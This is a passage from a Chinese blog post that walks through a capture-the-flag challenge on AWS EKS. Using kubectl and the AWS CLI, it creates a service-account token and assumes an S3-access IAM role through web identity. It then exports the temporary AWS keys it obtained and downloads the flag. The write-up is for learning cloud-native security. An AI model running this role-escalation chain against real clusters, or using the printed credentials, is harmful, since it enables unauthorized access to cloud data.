class="attr">eks.amazonaws.com/role-arn:</span> <span class="string">arn:aws:iam::688655246681:role/challengeEksS3Role</span></span><br><span class="line">    <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-10-31T20:07:34Z&quot;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">s3access-sa</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">challenge5</span></span><br><span class="line">    <span class="attr">resourceVersion:</span> <span class="string">&quot;671916&quot;</span></span><br><span class="line">    <span class="attr">uid:</span> <span class="string">86e44c49-b05a-4ebe-800b-45183a6ebbda</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">List</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">resourceVersion:</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>查看secrets</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228203814364.png" alt="image-20231228203814364"></p>
<p>从上述服务帐户得出的结果，</p>
<p>- 附加到 SA“debug-sa”的 IAM 角色是challengeTestRole-fc9d18e</p>
<p>- 附加到 SA “s3access-sa”的IAM角色是challengeEksS3Role</p>
<p>只允许为“debug-sa”创建token（通过运行“kubectl auth can-i — list”来识别），并且需要承担challengeEksS3Role来获取我们的flag，我们可以通过web身份验证的方式来创建。</p>
<h4 id="5-6-为debug-sa创建token并获取权限"><a href="#5-6-为debug-sa创建token并获取权限" class="headerlink" title="5.6 为debug-sa创建token并获取权限"></a>5.6 为debug-sa创建token并获取权限</h4><p>创建token（注意这里需要指定audience之前有提到，这是策略生效的前提）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debugsatoken=$(kubectl create token debug-sa --audience=sts.amazonaws.com)</span><br></pre></td></tr></table></figure>

<p>设置 AWS CLI web身份验证（注意这里的IAM角色需要指定为challengeEksS3Role）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts assume-role-with-web-identity --web-identity-token $debugsatoken --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name hacked</span><br></pre></td></tr></table></figure>

<p>设置环境变量（根据上一条指令返回的结果）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AWS_ACCESS_KEY_ID=ASIA2AVYNEVMXISURJO2</span><br><span class="line"><span class="built_in">export</span> AWS_SECRET_ACCESS_KEY=xYjl4N8DiuiBQY8wlndh7nJESeg/oUHFxVfJbBcw</span><br><span class="line"><span class="built_in">export</span> AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMSJGMEQCIEQzKvzrEE3D62jc+bkhhI4gzyYYHoeuZkFrDXCdL44XAiB78MAlAbk5MpTlgoioZF4QD2GOIeJ05XlWuiAoVRy03SrABAi+//////////8BEAAaDDY4ODY1NTI0NjY4MSIMrgWnIMgZ8Q4Kg+sWKpQEUhXDLq0Yu3DPW/TemlVwpSu2BBKFUNNV7d+xgJk6DqCd6YcryXyyW1jAl5ycf6tWQiUTq6M8nadEE1piS2Uafl8laOpMvPnykVqrtIsb0Du6lDDIPssHBmqDn8b682FqxOI8Yo4HfpnsXCxDV655k94An5ilkDaZ7+YKo3Vn++ovr/ntm2HkCc8l2cCm2kmkWxIa8+qmymHe2rDecq368nd2MDD0XjDFMoXJZswgHSCPpT98/rXXC1BaSazivslVNispb6CgQe5e7IBAA0ggp3rKvzmfiWkMLqh5+Bd3cbqjl/4Jf7UzjthaWmhpX3Fz/4XooJQYmFP7gchyD8epb8g7KT2umN0/gqvSw2JzFHn9pSexjPo3npyMkbaKR3Z0fmidCaMx5+rmiVsDp/S+QtSXe/pFV6RMlJLXlFFICp9fjQ4L1bEBJFJqJrUSfIKIm5V7JvgThSsuXrd6OnZMGSqOUUjPD9v0cRrz3BpT7vRdMDJRJ8eqze0/Z90Z38Z1in7bG6QHPzoBmqmGnPH9+5L363DXQo1r4HWdQM8ZZqbVCRItUlLXdpaVTjiR4I0P6pZrrUjPFtxG/Vju6UwDdeTqqGsp11j/hTItPKwE5TNT0Ey/rdBxgFhgqIV3jdjqxpGOqLd8KE8ID7er9Bx9KazY2oTsFURG3vdoQ0cpnsE2aa84/4vvWZ1/TYgQtPD579G+8jC33rWsBjqWAfBIVjz4k5/bvDn+imLRw7fC93ko49up5DTj+wJYPmHUSZpYo1RhGzxFU1iemWTbI2VnuEiEf1x/UKp+RmbahEiFyvnuUglSOK/+/x2IGTSWPZC+yo1uXNOzxOAS3A8GWvwr0DxaG1/r0ahZU2ZABw4kdt+WZRXcsIgGtW1Hg34mzoQhfTPzwfmSfltvPAv1DRKpArkk/g==</span><br></pre></td></tr></table></figure>

<h4 id="5-7-获取存储bucket中的flag"><a href="#5-7-获取存储bucket中的flag" class="headerlink" title="5.7 获取存储bucket中的flag"></a>5.7 获取存储bucket中的flag</h4><p>查看我的角色</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROA2AVYNEVMZEZ2AFVYI:hacked&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;688655246681&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/hacked&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>下载flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">cp</span> s3://challenge-flag-bucket-3ff1ae2/flag .</span><br></pre></td></tr></table></figure>

<h2 id="6-参考文献"><a href="#6-参考文献" class="headerlink" title="6. 参考文献"></a>6. 参考文献</h2><p><a target="_blank" rel="noopener" href="https://blog.aquasec.com/the-ticking-supply-chain-attack-bomb-of-exposed-kubernetes-secrets">暴露kubernetes秘密的滴答作响的供应链攻击炸弹</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/379293478">浅谈云上攻防之-元数据服务带来的安全挑战</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/andresriancho/enumerate-iam/tree/master">aws的iam权限探测脚本</a></p>
</p><div class="tip">本文采用CC-BY-SA-3.0协议，转载请注明出处<br>Author: Sally</div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-30</span><i class="fa fa-tag"></i><a class="tag" href="/tags/容器安全/" title="容器安全">容器安全 </a><span class="leancloud_visitors"></span><span>About3975words, 13min15secread</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,https://phoenixmerk.github.io/2023/12/30/从EKS-CTF看云原生安全/,Sally's Blog,从EKS-CTF看云原生安全,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2024/01/16/lxcfs%20cgroup%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" title="lxcfs cgroup错误配置容器逃逸">Post Anterior</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2023/11/27/%E5%9F%BA%E7%A1%80%E9%95%9C%E5%83%8F/" title="基础镜像">Próximo post</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div><script src="/js/baidu-tongji.js"></script></body></html>